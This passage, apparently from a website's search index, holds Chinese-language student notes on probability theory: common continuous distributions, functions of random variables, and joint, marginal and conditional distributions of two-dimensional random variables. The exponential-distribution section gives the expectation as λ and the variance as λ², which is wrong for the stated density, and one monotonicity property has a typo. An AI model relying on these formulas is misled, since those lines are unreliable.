<p>\u5e38\u7528\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u5206\u5e03\uff1a</p> <ul> <li> <p>\u5747\u5300\u5206\u5e03</p> <p>\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u5728\u533a\u95f4 \\([a,b]\\) \u4e0a\u670d\u4ece\u5747\u5300\u5206\u5e03\uff0c\u5373 \\(X\\sim U[a,b]\\)\uff0c\u5219\u5176\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u548c\u5206\u5e03\u51fd\u6570\u5982\u4e0b\uff1a</p> \\[ p(x)=\\begin{cases} \\dfrac{1}{b-a},&amp;a&lt;x&lt;b,\\\\ 0,&amp;\\text{otherwise}. \\end{cases}, F(x)=\\begin{cases} 0,&amp;x&lt;a,\\\\ \\dfrac{x-a}{b-a},&amp;a\\le x&lt;b,\\\\ 1,&amp;x\\ge b. \\end{cases} \\] <p>\u671f\u671b\u548c\u65b9\u5dee\u5982\u4e0b\uff1a</p> \\[ \\mathrm{E}X=\\dfrac{a+b}{2},\\mathrm{Var}X=\\dfrac{1}{12}(b-a)^2 \\] </li> <li> <p>\u6307\u6570\u5206\u5e03</p> <p>\u5bf9\u4e8e\u5e38\u6570 \\(\\lambda&gt;0\\)\uff0c\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(\\lambda\\) \u7684\u6307\u6570\u5206\u5e03\uff0c\u5373 \\(X\\sim E(\\lambda)\\)\uff0c\u5219\u5176\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u548c\u5206\u5e03\u51fd\u6570\u5982\u4e0b\uff1a</p> \\[ p(x)=\\begin{cases} \\lambda \\mathrm{e}^{-\\lambda x},&amp;x\\ge 0,\\\\ 0, &amp;x&lt;0. \\end{cases}, F(x)=\\begin{cases} 1-\\mathrm{e}^{-\\lambda x},&amp;x\\ge 0,\\\\ 0,&amp;x&lt;0. \\end{cases} \\] <p>\u671f\u671b\u548c\u65b9\u5dee\u5982\u4e0b\uff1a</p> \\[ \\mathrm{E}X=\\lambda,\\mathrm{Var}X=\\lambda^2 \\] <p>\u8be5\u5206\u5e03\u5e38\u7528\u4e8e\u63cf\u8ff0\u5404\u79cd\u5bff\u547d\u7684\u5206\u5e03.</p> </li> <li> <p>\u6b63\u6001\u5206\u5e03</p> <p>\u5bf9\u4e8e\u5e38\u6570 \\(\\mu\\) \u548c\u6b63\u5e38\u6570 \\(\\sigma&gt;0\\)\uff0c\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf X \u670d\u4ece\u53c2\u6570\u4e3a \\(\\mu,\\sigma^2\\) \u7684\u6b63\u6001\u5206\u5e03\uff0c\u5373 \\(X\\sim N(\\mu,\\sigma^2)\\)\uff0c\u5219\u5176\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u5982\u4e0b\uff1a</p> \\[ p(x)=\\dfrac{1}{\\sqrt{2\\pi}\\sigma}\\mathrm{exp}\\left(-\\dfrac{(x-\\mu)^2}{2\\sigma^2}\\right) \\] <p>\u671f\u671b\u548c\u65b9\u5dee\u5982\u4e0b\uff1a</p> \\[ \\mathrm{E}X=\\mu,\\mathrm{Var}X=\\sigma^2 \\] <p>\u6027\u8d28\uff1a</p> <p>(1) \u66f2\u7ebf \\(p(x)\\) \u5173\u4e8e \\(x=\\mu\\) \u5bf9\u79f0\uff0c\u4e14 \\(\\forall b&gt;0\\) \u6709 \\(\\mathrm{Pr}(X\\le \\mu-b)=\\mathrm{Pr}(X\\ge \\mu +b)\\).</p> <p>(2) \\(x\\to\\pm\\infty\\) \u65f6 \\(p(x)\\to 0\\)\uff0c\u5373\u66f2\u7ebf\u4ee5 \\(x\\) \u8f74\u4e3a\u6e10\u8fd1\u7ebf.</p> <p>(3) \\(x=\\mu\\) \u65f6 \\(p(x)\\) \u53d6\u5230\u6700\u5927\u503c \\(\\dfrac{1}{\\sqrt{2\\pi}\\sigma}\\)\uff0c\u53c8\u56e0\u5bc6\u5ea6\u56fe\u5f62\u8986\u76d6\u9762\u79ef\u603b\u4e3a \\(1\\)\uff0c\u6545\u56fa\u5b9a \\(\\mu\\) \u65f6\uff0c\\(\\sigma\\) \u8d8a\u5c0f\uff0c\u6700\u5927\u503c\u8d8a\u5927\uff0c\u56fe\u5f62\u8d8a\u9ad8\u8d8a\u9661\u5ced\uff1b\\(\\sigma\\) \u8d8a\u5927\uff0c\u6700\u5927\u503c\u8d8a\u5c0f\uff0c\u56fe\u5f62\u8d8a\u4f4e\u8d8a\u5e73\u7f13.</p> <p>(4) \u56fa\u5b9a \\(\\sigma\\)\uff0c\u800c \\(\\mu\\) \u53d8\u5316\u65f6\uff0c\u66f2\u7ebf\u6a2a\u5411\u5e73\u79fb.</p> <p>(5) \u5f53 \\(\\mu=0,\\sigma=1\\) \u65f6\uff0c\\(X\\sim N(0,1)\\)\uff0c\u79f0\u6b64\u65f6\u5176\u670d\u4ece\u6807\u51c6\u6b63\u6001\u5206\u5e03\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u548c\u5206\u5e03\u51fd\u6570\u7279\u522b\u8bb0\u4e3a \\(\\varphi(x)\\) \u4e0e \\(\\varPhi(x)\\). \u5176\u663e\u7136\u6709 \\(\\varPhi(-x)=1-\\varPhi(x)\\).</p> <p>(6) \u82e5 \\(X\\sim N(\\mu,\\sigma^2)\\)\uff0c\u5219 \\(Z=\\dfrac{X-\\mu}{\\sigma}\\sim N(0,1)\\)\uff0c\u6545\u800c\u6b32\u8ba1\u7b97\u670d\u4ece\u67d0\u6b63\u6001\u5206\u5e03\u7684\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u5728\u67d0\u533a\u95f4\u7684\u6982\u7387\uff0c\u5e38\u5e38\u5c06\u5176\u6807\u51c6\u5316\u914d\u5408 \\(\\varPhi(x)\\) \u7684\u56fe\u8868\u8fdb\u884c\u8fd1\u4f3c\u8ba1\u7b97.</p> <p>(7) \\(3\\sigma\\) \u6cd5\u5219\uff1a(6) \u7684\u7279\u4f8b\uff0c\\(2\\varPhi(1)-1\\approx 0.6826, 2\\varPhi(2)-1\\approx 0.9544, 2\\varPhi(3)-1\\approx 0.9974\\).</p> </li> </ul>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-2-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#_4","title":"\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u5206\u5e03","text":"<p>(1) \u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u7684\u51fd\u6570\uff0c\u679a\u4e3e\u5373\u53ef. </p> <p>\u8bbe \\(X\\) \u4e3a\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u5206\u5e03\u5f8b\u4e3a \\(\\mathrm{Pr}(X=x_k)=p_k,k=1,2,\\cdots\\)\uff0c\u5bf9\u4e8e \\(X\\) \u7684\u51fd\u6570 \\(Y=g(X)\\)\uff0c\u5176\u5206\u5e03\u5f8b\u4e3a\uff1a</p> \\[ \\mathrm{Pr}(Y=y_k)=\\sum_{i,y_k=g(x_i)}p_i \\] <p>(2) \u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u7684\u51fd\u6570\uff0c\u6c42\u89e3\u5e38\u91c7\u7528\u5206\u5e03\u51fd\u6570\u6cd5.</p> <p>\u8bbe \\(X\\) \u4e3a\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\\(y=g(x)\\) \u4e3a\u8fde\u7eed\u5b9e\u51fd\u6570\uff0c\u5219 \\(Y=g(X)\\) \u4e5f\u662f\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5148\u6c42\u89e3 Y \u7684\u5206\u5e03\u51fd\u6570 \\(F_Y(y)\\)\uff1a</p> \\[ F_Y(y)=\\mathrm{Pr}(Y\\le y)=\\mathrm{Pr}(g(X)\\le y)=\\int_{x:g(x)\\le y}p_X(x)\\mathrm{d}x \\] <p>\u7136\u540e \\(p_Y(y)=F\u2019_Y(y)\\).</p> <p>(3) \u7279\u522b\u5730\uff0c\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u53ef\u80fd\u53d6\u503c\u8303\u56f4\u4e3a \\((a,b)\\)\uff0c\\(X\\) \u7684\u6982\u7387\u5bc6\u5ea6\u4e3a \\(p_X(x), a&lt;x&lt;b\\)\uff08\\(a,b\\) \u4e0d\u5fc5\u6709\u9650\uff09\uff0c\u8bbe\u51fd\u6570 \\(y=g(x)\\) \u5904\u5904\u53ef\u5bfc\uff0c\u4e14 \\(g\u2019(x)\\) \u6052\u6b63\uff08\u6216\u6052\u8d1f\uff09\uff0c\u5219 \\(Y=g(X)\\) \u4e3a\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u6982\u7387\u5bc6\u5ea6\u4e3a\uff1a</p> \\[ p_Y(y)=\\begin{cases} p_X(g^{-1}(y))\\cdot |(g^{-1}(y))'|,&amp;\\alpha&lt;y&lt;\\beta,\\\\ 0,&amp;\\text{otherwise.} \\end{cases} \\] <p>\u5176\u4e2d \\(\\alpha=\\min\\{g(a),g(b)\\},\\beta=\\max\\{g(a),g(b)\\},g^{-1}(y)\\) \u4e3a \\(y=g(x)\\) \u7684\u53cd\u51fd\u6570.</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-3-%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/","title":"Ch.3 \u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u53ca\u5176\u5206\u5e03","text":""},{"location":"in_class_learning/semester_3/probability_theory/Ch-3-%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/#_1","title":"\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf","text":"<p>\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u7684\u8054\u5408\u5206\u5e03\u51fd\u6570/\u5206\u5e03\u51fd\u6570\uff1a\u8bbe \\((X,Y)\\) \u4e3a\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\uff0c\u5bf9\u4efb\u610f\u5b9e\u6570 \\((x,y)\\)\uff0c\u4e8c\u5143\u51fd\u6570</p> \\[ F(x,y)=\\text{Pr}((X\\le x)\\cap(Y\\le y))=\\text{Pr}(X\\le x,Y\\le y) \\] <p>\u79f0\u4e3a\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf (X,Y) \u7684\u8054\u5408\u5206\u5e03\u51fd\u6570\uff0c\u7b80\u79f0\u5206\u5e03\u51fd\u6570.</p> <p>\u6027\u8d28\uff1a</p> <p>(1) \\(F(x,y)\\) \u5206\u522b\u662f \\(x\\) \u548c \\(y\\) \u7684\u5355\u8c03\u4e0d\u51cf\u51fd\u6570\uff0c\u5373 \\(x_2&gt;x_1\\rightarrow F(x_2,y)\\ge F(x_1,y)\\land y_2&gt;y_1\\rightarrow F(x,y_2)\\ge F(x_1,y)\\) \u4e3a\u771f.</p> <p>(2) \u5fc5\u6709 \\(0\\le F(x,y)\\le 1\\)\uff0c\u4e14 \\(F(-\\infty, y)=F(x,-\\infty)=F(-\\infty, -\\infty)=0, F(+\\infty, +\\infty) =1\\).</p> <p>(3) \\(F(x,y)\\) \u5173\u4e8e \\(x,y\\) \u53f3\u8fde\u7eed\uff0c\u5373 \\(F(x+0,y)=F(x,y+0)=F(x,y)\\).</p> <p>(4) \u5bf9\u4efb\u610f\u5b9e\u6570 \\(x_2&gt;x_1, y_2&gt;y_1\\)\uff0c\u6709 \\(1\\ge F(x_2,y_2)-F(x_2, y_1)-F(x_1,y_2)+F(x_1,y_1)\\ge 0\\).</p> <p>\u5f53 \\(F\\) \u4e3a\u5206\u5e03\u51fd\u6570\u65f6\uff0c\u4e0a\u8ff0\u56db\u6761\u6210\u7acb\uff1b\u53cd\u4e4b\u82e5\u67d0\u51fd\u6570\u6ee1\u8db3\u4e0a\u8ff0\u56db\u6761\uff0c\u5219\u5fc5\u7136\u5b58\u5728\u968f\u673a\u53d8\u91cf\u4f7f\u4e4b\u6210\u4e3a\u5176\u5206\u5e03\u51fd\u6570.</p> <p>\u8fb9\u7f18\u5206\u5e03\u4e0e\u8fb9\u7f18\u5206\u5e03\u51fd\u6570</p> <p>\u5b9a\u4e49\uff1a\u5bf9\u4e8e\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf \\((X,Y)\\)\uff0c\u5355\u4e2a\u968f\u673a\u53d8\u91cf \\(X\\) \u6216 \\(Y\\) \u7684\u5206\u5e03\u79f0\u4e3a\u8fb9\u7f18\u5206\u5e03,</p> <p>\u5df2\u77e5\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf \\((X,Y)\\) \u7684\u8054\u5408\u5206\u5e03\u51fd\u6570 \\(F(x,y)\\)\uff0c\u53ef\u4ee5\u8f7b\u6613\u5f97\u5230\u5176\u8fb9\u7f18\u5206\u5e03\u51fd\u6570\uff1a</p> \\[ F_X(x)=F(x,+\\infty),F_Y(y)=F(+\\infty,y) \\] <p>\u63a8\u5e7f\uff1a\\(n\\) \u7ef4\u968f\u673a\u53d8\u91cf\u7684\u8fb9\u7f18\u5206\u5e03\u51fd\u6570\uff1a</p> <p>\u5df2\u77e5 \\(n\\) \u7ef4\u968f\u673a\u53d8\u91cf \\((X_1,X_2,\\cdots,X_n)\\) \u7684\u8054\u5408\u5206\u5e03\u51fd\u6570 \\(F(x_1,x_2,\\cdots,x_n)\\)\uff0c\u53ef\u4ee5\u8f7b\u6613\u5f97\u5230\u5176 \\(k\\) \u7ef4\u8fb9\u7f18\u5206\u5e03\u51fd\u6570\uff1a</p> \\[ F_{(X_{i_1},\\cdots,X_{i_k})}(\\cdots,+\\infty,x_{i_1},+\\infty,\\cdots,x_{i_k})=F(c_1,\\cdots,c_n)\\\\ c_{i_{j}}=x_{i_{j}},c_t=+\\infty(\\text{otherwise}) \\] <p>\u72ec\u7acb\u6027\u6761\u4ef6\uff1a\u8bbe\u968f\u673a\u53d8\u91cf \\(X,Y\\) \u6ee1\u8db3\uff0c\u5bf9\u4efb\u610f \\(x,y\\)\uff0c\u968f\u673a\u4e8b\u4ef6 \\(X\\le x\\) \u4e0e \\(Y\\le y\\) \u72ec\u7acb\uff0c\u5373</p> \\[ \\text{Pr}(X\\le x,Y\\le y)=\\text{Pr}(X\\le x)\\text{Pr}(Y\\le y) \\] <p>\u5373</p> \\[ F(x,y)=F_X(x)F_Y(y) \\] <p>\u5219\u79f0\u968f\u673a\u53d8\u91cf \\(X, Y\\) \u76f8\u4e92\u72ec\u7acb.</p> <p>\u6027\u8d28\uff1a</p> <p>\u82e5\u968f\u673a\u53d8\u91cf \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\\(f(x), g(y)\\) \u4e3a \\(X,Y\\) \u7684\u8fde\u7eed\u6216\u5206\u6bb5\u8fde\u7eed\u51fd\u6570\uff0c\u5219\u968f\u673a\u53d8\u91cf\u7684\u51fd\u6570 \\(f(X)\\) \u4e0e \\(g(Y)\\) \u76f8\u4e92\u72ec\u7acb.</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-3-%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/#_2","title":"\u4e8c\u7ef4\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf","text":"<p>\u5b9a\u4e49\uff1a\u82e5\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf \\((X,Y)\\) \u7684\u53ef\u80fd\u53d6\u503c\u65f6\u6709\u9650\u591a\u4e2a\u6216\u53ef\u5217\u65e0\u9650\u591a\u4e2a\uff0c\u5219\u79f0 \\((X,Y)\\) \u4e3a\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf.</p> <p>\u8054\u5408\u5206\u5e03\u5f8b\uff1a\u8bbe\u4e8c\u7ef4\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf \\((X,Y)\\) \u7684\u6240\u6709\u53ef\u80fd\u53d6\u503c\u4e3a \\((x_i,y_j),i,j=1,2,\\cdots\\) \u5219\uff1a</p> \\[ \\text{Pr}(X=x_i,Y=y_j)=p_{i,j} \\] <p>\u6216\u5176\u4e8c\u7ef4\u8868\u683c\u5f62\u5f0f\uff0c\u79f0\u4e3a \\((X,Y)\\) \u7684\u8054\u5408\u5206\u5e03\u5f8b.</p> <p>\u6027\u8d28\uff1a</p> <p>(1) \\(p_{i,j}\\ge 0\\).</p> <p>(2) \\(\\sum_{i=1}^{\\infty}\\sum_{j=1}^{\\infty}p_{i,j}=1\\).</p> <p>\u8fb9\u7f18\u5206\u5e03\uff1a</p> \\[ \\text{Pr}(X=x_i)=\\sum_{j=1}^{\\infty}\\text{Pr}(X=x_i,Y=y_j)=\\sum_{j=1}^{\\infty}p_{i,j}=:p_{i,\\bullet} \\] <p>\u6216\u5176\u8868\u683c\u5f62\u5f0f\uff0c\u79f0\u4e3a \\(X\\) \u7684\uff08\u8fb9\u7f18\uff09\u5206\u5e03\u5f8b.</p> <p>\u540c\u7406\u6709\uff1a\\(p_{\\bullet, j}=\\sum_{i=1}^{\\infty} p_{i,j}\\).</p> <p>\u8054\u5408\u5206\u5e03\u5f8b\u548c\u8fb9\u7f18\u5206\u5e03\u7387\u5728\u540c\u4e00\u8868\u4e2d\u7684\u5f62\u5f0f\u5982\u4e0b\uff1a</p> <p></p> <p>\u8054\u5408\u5206\u5e03\u51fd\u6570\uff1a</p> \\[ F(x,y)=\\sum_{x_i\\le x}\\sum_{y_j\\le y}p_{i,j} \\] <p>\u8fb9\u7f18\u5206\u5e03\u51fd\u6570\uff1a</p> \\[ F_X(x)=\\sum_{x_i\\le x}p_{i,\\bullet},F_{Y}(y)=\\sum_{y_j\\le y}p_{\\bullet,j} \\] <p>\u533a\u57df\u53d6\u503c\uff1a</p> \\[ \\text{Pr}((X,Y)\\in D)=\\sum_{(x_i,y_j)\\in D}p_{i,j} \\] <p>\u72ec\u7acb\u6027\u6761\u4ef6\uff1a</p> \\[ p_{i,j}=p_{i,\\bullet}\\cdot p_{\\bullet,j} \\] <p>\u5e38\u7528\u4e8c\u7ef4\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u5206\u5e03</p> <p>\u4e09\u9879\u5206\u5e03\uff1a\\((X,Y)\\sim T(n,p_1,p_2)\\)</p> <p>\u5176\u4e2d\uff1a\\(0&lt;p_1,p_2,p_1+p_2&lt;1\\).</p> <p>\u5206\u5e03\u5f8b\uff1a</p> \\[ \\text{Pr}(X=i,Y=j)=\\dfrac{n!}{i!j!(n-i-j)!}{p_1}^{i}{p_2}^j(1-p_1-p_2)^{n-i-j}\\\\ i,j=0,1,\\cdots,n,i+j\\le n \\] <p>\u8fb9\u7f18\u5206\u5e03\uff1a\u662f\u4e8c\u9879\u5206\u5e03\uff0c\u5373 \\(X\\sim B(n,p_1), Y\\sim B(n,p_2)\\).</p> <p>\u4e09\u9879\u5206\u5e03\u662f\u4e8c\u9879\u5206\u5e03\u7684\u63a8\u5e7f\uff0c\u662f\u591a\u9879\u5206\u5e03\u7684\u4e00\u79cd.</p> <p>\u4e8c\u7ef4\u8d85\u51e0\u4f55\u5206\u5e03</p> <p>\u5206\u5e03\u5f8b\uff1a</p> \\[ \\text{Pr}(X=n_1,Y=n_2)=\\dfrac{\\binom{N_1}{n_1}\\binom{N_2}{n_2}\\binom{N_3}{n_3}}{\\binom{N}{n}} \\] <p>\u5176\u4e2d \\(N=N_1+N_2+N_3,n=n_1+n_2+n_3\\).</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-3-%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/#_3","title":"\u4e8c\u7ef4\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf","text":"<p>\u5b9a\u4e49\uff1a\u5bf9\u4e8e\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf \\((X,Y)\\) \u7684\u5206\u5e03\u51fd\u6570 \\(F(x,y)\\)\uff0c\u82e5\u5b58\u5728\u975e\u8d1f\u51fd\u6570 \\(p(x,y)\\)\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u4efb\u610f\u7684 \\((x,y)\\)\uff0c\u6709\uff1a</p> \\[ F(x,y)=\\int_{-\\infty}^x\\int_{-\\infty}^y p(u,v)\\mathrm{d}u\\mathrm{d}v \\] <p>\u5219\u79f0 \\((X,Y)\\) \u662f\u4e8c\u7ef4\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\u79f0 \\(p(x,y)\\) \u662f \\((X,Y)\\) \u7684\u8054\u5408\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff0c\u7b80\u79f0\u6982\u7387\u5bc6\u5ea6.</p> <p>\u6027\u8d28\uff1a</p> <p>(1) \\(p(x,y)\\ge 0\\).</p> <p>(2) \\(\\int_{-\\infty}^{+\\infty}\\int_{-\\infty}^{+\\infty} p(u,v)\\mathrm{d}u\\mathrm{d}v=F(+\\infty,+\\infty)=1\\).</p> <p>(3) \u8bbe \\(D\\) \u662f\u5e73\u9762\u533a\u57df\uff0c\u5219\u968f\u673a\u70b9 \\((X,Y)\\) \u843d\u5165 \\(D\\) \u5185\u7684\u6982\u7387\u4e3a\uff1a</p> \\[ \\text{Pr}((X,Y)\\in D)=\\iint_{D}p(x,y)\\mathrm{d}x\\mathrm{d}y \\] <p>(4) \u82e5 \\(p(x,y)\\) \u5728\u70b9 \\((x,y)\\) \u5904\u8fde\u7eed\uff0c\u5219\uff1a</p> \\[ \\dfrac{\\partial^2F(x,y)}{\\partial x\\partial y}=p(x,y) \\] <p>\u8fb9\u7f18\u5206\u5e03\u51fd\u6570\u4e0e\u8fb9\u7f18\u5bc6\u5ea6\u51fd\u6570\uff1a</p> <p>\u8fb9\u7f18\u5206\u5e03\u51fd\u6570\uff1a</p> \\[ F_X(x)=F(x,+\\infty)=\\int_{-\\infty}^x\\int_{-\\infty}^{+\\infty}p(t,y)\\mathrm{d}y\\mathrm{d}t\\\\ F_Y(y)=F(+\\infty,y)=\\int_{-\\infty}^{y}\\int_{-\\infty}^{+\\infty}p(x,t)\\mathrm{d}x\\mathrm{d}t \\] <p>\u8fb9\u7f18\u5bc6\u5ea6\u51fd\u6570\uff1a</p> \\[ p_X(x)=F_{X}'(x)=\\int_{-\\infty}^{+\\infty}p(x,y)\\mathrm{d}y\\\\ p_Y(y)=F_Y'(y)=\\int_{-\\infty}^{+\\infty}p(x,y)\\mathrm{d}x \\] <p>\u72ec\u7acb\u6027\u6761\u4ef6\uff1a</p> <p>\u7528\u8fb9\u7f18\u5206\u5e03\u51fd\u6570\u63cf\u8ff0\uff1a</p> \\[ F(x,y)=F_X(x)F_Y(y)\\qquad\\forall (x,y) \\] <p>\u6216\u8005\u7528\u8fb9\u7f18\u5bc6\u5ea6\u51fd\u6570\u63cf\u8ff0\uff1a</p> \\[ p(x,y)=p_X(x)p_Y(y)\\qquad\\forall (x,y) \\] <p>\u4e0a\u8ff0\u7ed3\u679c\u53ef\u4ee5\u63a8\u5e7f\u81f3 \\(n\\) \u7ef4\u968f\u673a\u53d8\u91cf\uff1a</p> <p>\u6982\u7387\u5bc6\u5ea6\uff1a</p> \\[ F(x_1,x_2,\\cdots,x_n)=\\int_{-\\infty}^{x_1}\\int_{-\\infty}^{x_2}\\cdots\\int_{-\\infty}^{x_n}p(x_1,x_2,\\cdots,x_n)\\mathrm{d}x_1\\mathrm{d}x_2\\cdots \\mathrm{d}x_n \\] <p>\\(k\\) \u7ef4\u8fb9\u7f18\u5206\u5e03\u51fd\u6570\uff1a</p> \\[ F_{(X_{i_1},\\cdots,X_{i_k})}(\\cdots,+\\infty,x_{i_1},+\\infty,\\cdots,x_{i_k})=F(c_1,\\cdots,c_n)\\\\ c_{i_{j}}=x_{i_{j}},c_t=+\\infty(\\text{otherwise}) \\] <p>\u72ec\u7acb\u6027\u6761\u4ef6\uff1a\\((X_1,X_2,\\cdots, X_n)\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5f53</p> \\[ p(x_1,x_2,\\cdots,x_n)=p_{X_1}(x_1)p_{X_2}(x_2)\\cdots p_{X_n}(x_n)\\qquad \\forall (x_1,x_2,\\cdots x_n) \\] <p>\u5e38\u7528\u4e8c\u7ef4\u8fde\u7eed\u6027\u968f\u673a\u53d8\u91cf\u5206\u5e03</p> <p>\u4e8c\u7ef4\u5747\u5300\u5206\u5e03</p> <p>\u8bbe \\(D\\) \u4e3a\u5e73\u9762\u6709\u754c\u533a\u57df\uff0c\u5176\u9762\u79ef\u4e3a \\(S_D\\)\uff0c\u82e5\u4e8c\u7ef4\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf (X,Y) \u7684\u8054\u5408\u5bc6\u5ea6\u4e3a\uff1a</p> \\[ p(x,y)=\\begin{cases} \\frac{1}{S_D}, &amp;(x,y)\\in D,\\\\0, &amp;\\text{otherwise}. \\end{cases} \\] <p>\u5219\u79f0 \\((X,Y)\\) \u670d\u4ece\u533a\u57df \\(D\\) \u4e0a\u7684\u4e8c\u7ef4\u5747\u5300\u5206\u5e03.</p> <p>\u6027\u8d28\uff1a\u5bf9\u4e8e \\(D_k\\subseteq D\\)\uff1a</p> \\[ \\text{Pr}((X,Y)\\in D_k)=\\dfrac{S_{D_k}}{S_D} \\] <p>\u4e8c\u7ef4\u6b63\u6001\u5206\u5e03\uff1a\\((X,Y)\\sim N(\\mu_1,\\mu_2,\\sigma_1^2,\\sigma_2^2,\\rho)\\)</p> <p>\u82e5\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf \\((X,Y)\\) \u7684\u8054\u5408\u5bc6\u5ea6\u4e3a\uff1a</p> \\[ p(x,y)=\\dfrac{1}{2\\pi\\sigma_1\\sigma_2\\sqrt{1-\\rho^2}}\\mathrm{exp}\\left(-\\dfrac{\\left(\\dfrac{x-\\mu_1}{\\sigma_1}\\right)^2-2\\rho \\left(\\dfrac{x-\\mu_1}{\\sigma_1}\\right)\\left(\\dfrac{y-\\mu_2}{\\sigma_2}\\right)+\\left(\\dfrac{y-\\mu_2}{\\sigma_2}\\right)^2}{2(1-\\rho^2)} \\right) \\] <p>\u5176\u4e2d \\(\\mu_1,\\mu_2\\) \u5747\u4e3a\u5e38\u6570\uff0c\\(\\sigma_1,\\sigma_2&gt;0,|\\rho|&lt;1\\) \u5747\u4e3a\u5e38\u6570\uff0c\u5219\u79f0 \\((X,Y)\\) \u7b26\u5408\u4e8c\u7ef4\u6b63\u6001\u5206\u5e03.</p> <p>\u6027\u8d28\uff1a</p> <p>(1) \u8fb9\u7f18\u5206\u5e03\uff1a\\(X\\sim N(\\mu_1,\\sigma_1^2), Y\\sim N(\\mu_2,\\sigma_2^2)\\).</p> <p>(2) \u72ec\u7acb\u7684\u5145\u8981\u6761\u4ef6\uff1a\\(\\rho=0\\).</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-3-%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/#_4","title":"\u6761\u4ef6\u5206\u5e03","text":"<p>\u8bbe X \u7684\u5206\u5e03\u51fd\u6570\u4e3a \\(F(x)=\\text{Pr}(X\\le x)\\)\uff0c\u5219\u968f\u673a\u4e8b\u4ef6 \\(A =\\{X\\in S\\}\\) \u53d1\u751f\u6761\u4ef6\u4e0b\u7684\u6761\u4ef6\u5206\u5e03\u51fd\u6570\uff1a</p> \\[ F(x|A)=\\text{Pr}(X\\le x|A) \\] <p>\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u7684\u6761\u4ef6\u5206\u5e03</p> <p>\u8bbe \\((X,Y)\\) \u4e3a\u4e8c\u7ef4\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u6982\u7387\u5206\u5e03\u5f8b\u4e3a \\(\\text{Pr}(X=x_i,Y=y_j)=p_{i,j},i,j=1,2,\\cdots\\)\uff0c\u79f0</p> \\[ \\text{Pr}(X=x_i|Y=y_j)=\\dfrac{\\text{Pr}(X=x_i,Y=y_j)}{\\text{Pr}(Y=y_j)}=\\dfrac{p_{i,j}}{p_{\\bullet,j}} \\] <p>\u4e3a \\(Y=y_j\\) \u6761\u4ef6\u4e0b\uff0c\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u6761\u4ef6\u5206\u5e03\u5f8b\uff0c\u8868\u683c\u5f62\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>X|_{Y=y_j}    |         x_1           |  \\cdots  |         x_i           |  \\cdots\n--------------+-----------------------+----------+-----------------------+----------\nP             | p_{1,j}/p_{\\bullet,j} |  \\cdots  | p_{i,j}/p_{\\bullet,j} |  \\cdots \n</code></pre> <p>\u540c\u7406\uff0c</p> \\[ \\text{Pr}(Y=y_j|X=x_i)=\\dfrac{\\text{Pr}(X=x_i,Y=y_j)}{\\text{Pr}(X=x_i)}=\\dfrac{p_{i,j}}{p_{i,\\bullet}} \\] <p>\u4e3a \\(X=x_i\\) \u6761\u4ef6\u4e0b\uff0c\u968f\u673a\u53d8\u91cf \\(Y\\) \u7684\u6761\u4ef6\u5206\u5e03\u5f8b.</p> <p>\u663e\u7136\uff0c\u5f53 